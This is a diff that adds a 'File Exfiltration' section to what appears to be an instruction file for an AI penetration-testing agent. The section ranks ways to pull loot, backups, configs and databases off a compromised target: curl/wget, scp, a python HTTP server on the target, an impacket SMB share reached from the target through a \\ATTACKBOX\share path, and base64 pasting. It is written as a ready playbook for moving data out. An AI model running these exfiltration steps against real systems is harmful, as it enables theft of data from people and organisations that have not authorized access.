@@ -141,6 +141,29 @@ reach the target.
 **Inline source code** written via heredoc in this skill does not need this
 workflow — the operator can read the code directly.
 
+## File Exfiltration
+
+When retrieving files from a compromised target (loot, backups, configs,
+databases), prefer direct download over encoding. Choose the first method
+that works:
+
+1. **Web-accessible** (file in webroot, served by HTTP/HTTPS)?
+   → `curl`/`wget` from attackbox. Fastest and cleanest.
+2. **SSH/SCP access available?**
+   → `scp user@target:/path/file ./engagement/evidence/`
+3. **Target can reach attackbox** (outbound HTTP)?
+   → Target: `python3 -m http.server 8080` from the file's directory
+   → Attackbox: `curl http://TARGET:8080/file -o evidence/file`
+4. **SMB available?**
+   → Attackbox: `impacket-smbserver share ./evidence -smb2support`
+   → Target: `copy file \\ATTACKBOX\share\file`
+5. **Last resort** (air-gapped, no outbound, no writable shares):
+   → `base64 file | tr -d '\n'` on target, paste on attackbox, decode
+   → Only for small files (<50KB)
+
+**Never default to base64 when a download method exists.** Base64 is slow,
+error-prone on large files, and produces unreadable blobs in shell transcripts.
+
 ## Shell Access (when RCE is achieved)
 
 When this skill achieves command execution on a target, **prefer establishing a
